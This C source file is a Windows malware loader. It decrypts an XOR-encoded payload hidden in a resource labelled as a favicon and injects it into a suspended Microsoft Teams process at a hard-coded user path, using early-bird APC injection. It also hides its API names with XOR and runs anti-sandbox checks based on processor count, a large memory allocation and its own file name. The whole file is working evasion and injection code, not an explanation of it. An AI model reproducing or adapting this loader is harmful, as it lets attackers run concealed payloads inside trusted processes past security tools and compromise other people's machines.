//
#pragma comment (lib, "advapi32")
#pragma comment(lib, "user32.lib")


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <string.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <windef.h>
#include <winbase.h>
#include <memoryapi.h>
#include "resources.h"


//typdefs

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);


LPVOID (WINAPI * pVirtualAllocEx) (
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);//kernel32.dll

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);//kernel32.dll

HANDLE(WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);//kernel32.dll

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
  DWORD dwFlags,
  DWORD th32ProcessID
);//kernel32.dll


char buffer[150];
char cout[] = ".\\ROTD.exe 2";
char key[] = "abcdefghijklmnopqrstuvwxyz";
unsigned char target [] = {'C',':','\\','U','s','e','r','s','\\','t','r','i','b','o','u','l','e','t','\\','A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','M','i','c','r','o','s','o','f','t','\\','T','e','a','m','s','\\','c','u','r','r','e','n','t','\\','T','e','a','m','s','.','e','x','e', 0x0};
//unsigned char target[] = "C:\\Users\\triboulet\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe";
//unsigned char target[] = {'n','o','t','e','p','a','d','.','e','x','e', 0x0};
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };	
unsigned char sVirtualAllocEx[] = { 0x37, 0xb, 0x11, 0x10, 0x10, 0x7, 0xb, 0x29, 0x5, 0x6, 0x4, 0xf, 0x28, 0x16 };
unsigned char sWriteProcessMemory[] = { 0x36, 0x10, 0xa, 0x10, 0x0, 0x36, 0x15, 0x7, 0xa, 0xf, 0x18, 0x1f, 0x20, 0xb, 0x2, 0x1f, 0x3, 0xb };
int threadId = 0;	
//int fake = 69;



//function calls
int checkMe(){
	//check if being emulated

	SYSTEM_INFO s;

	MEMORYSTATUSEX ms;	
	DWORD procNum;

	DWORD ram;

	unsigned char lpFileName[200];

	GetModuleFileName(NULL,(char *)lpFileName,sizeof(lpFileName));
		
	int result;
	char * last;
		
	char * token = strtok(lpFileName,"\\");

	char * mem = NULL;
	mem = (char *) malloc (6900000);

	
	if(mem == NULL){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return -1;
	}

	memset(mem,69,6900000);
	
	while(token != NULL){
		last = token;
		token = strtok(NULL,"\\");
	}
	result = strcmp(strlwr(last),"myapp.exe");

	
	if(result == NULL){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return -1;
	}
	
	GetSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;

	if(procNum < 4){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return -1;
	}

	free(mem);
		
	return 0;
}



void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j = 69;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}



	
//main
int main(int argc, char* argv[]) {
    //Hide Console
	//FreeConsole();
	
	unsigned char * payload = NULL;
	unsigned int payload_len;
	HMODULE handle = NULL;
	unsigned char * exec_mem = NULL;

    HANDLE hProc = NULL;
	
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
		
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	LPVOID pRemoteCode = NULL;

    if (argc == 1) goto def;

    ////case-switch statement
    switch (atoi(argv[1])) {

    case 0: //
    zero:
		
        WinExec(".\\ROTD.exe 1", 0);
        break;


    case 1: //inject payload into process

		if (checkMe() == 0){


			CreateProcessA(0, target, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

			// Extract payload from resources section
			res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
			resHandle = LoadResource(NULL, res);
			payload = (unsigned char *) LockResource(resHandle);
			payload_len = SizeofResource(NULL, res);
			
			exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			RtlMoveMemory(exec_mem, payload, payload_len);
			
			XOR((char *) exec_mem, payload_len, key, sizeof(key));
			XOR((char*)sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
			XOR((char*)sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
			
			HMODULE handle = GetModuleHandleA((LPCSTR)sKernel32);
			
			pVirtualAllocEx = GetProcAddress(handle, sVirtualAllocEx); 
			pWriteProcessMemory = GetProcAddress(handle, sWriteProcessMemory);

			pRemoteCode = pVirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			
			pWriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)exec_mem, (SIZE_T)payload_len, (SIZE_T *)NULL);

			QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
			
			threadId = (int) pi.dwThreadId;
			sprintf(buffer,"%s %d",cout,threadId);

			
			CloseHandle(handle);
			
			WinExec(buffer, 0);
		}
 
        break;


    case 2://Resume Thread
		if (checkMe() == 0){
			threadId = atoi(argv[2]);
			hProc = OpenThread(THREAD_ALL_ACCESS, NULL, threadId);
			ResumeThread(hProc);
			CloseHandle(hProc);
		}

        break;

    default: 
    def:

        if (checkMe() == 0) WinExec(".\\ROTD.exe 0", 0);	
        break;
    }


    return 0;

}